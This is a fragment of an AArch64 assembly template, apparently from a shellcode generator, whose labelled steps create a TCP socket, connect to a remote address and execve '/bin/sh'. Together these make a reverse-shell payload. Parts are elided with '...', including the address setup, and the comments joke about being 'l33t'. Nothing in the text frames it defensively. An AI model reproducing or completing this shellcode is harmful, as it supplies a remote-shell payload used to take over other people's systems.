...
create_sockfd:
    // int socket(int domain,   // x0 => AF_INET
    //            int type,     // x1 => SOCK_STREAM
    //            int protocol) // x2 => IPPROTO_IP
    mov x0, #{bits_socket.AF_INET}
    mov x1, #{bits_socket.SOCK_STREAM}
    mov x2, #{netinet_in.IPPROTO_IP}
    mov x8, #{self.syscalls['socket']}

    svc #1337 // call the supervisor xD and let the kernel know we're l33t

    mov x19, x0 // save the returned sockfd into x19

connect:
    // int connect(int sockfd,                  // x0 => sockfd obtained from socket() call
    //             const struct sockaddr *addr, // x1 => pointer to the stack containing formatted structure
    //             socklen_t addrlen);          // x2 => size of the sockaddr structure itself
    sub sp, sp, #16
...
execve:
    // int execve(const char *pathname,          // x0 => pointer to the stack containing '/bin/sh'
    //            char *const _Nullable argv[],  // x1 => NULL
    //            char *const _Nullable envp[]); // x2 => NULL
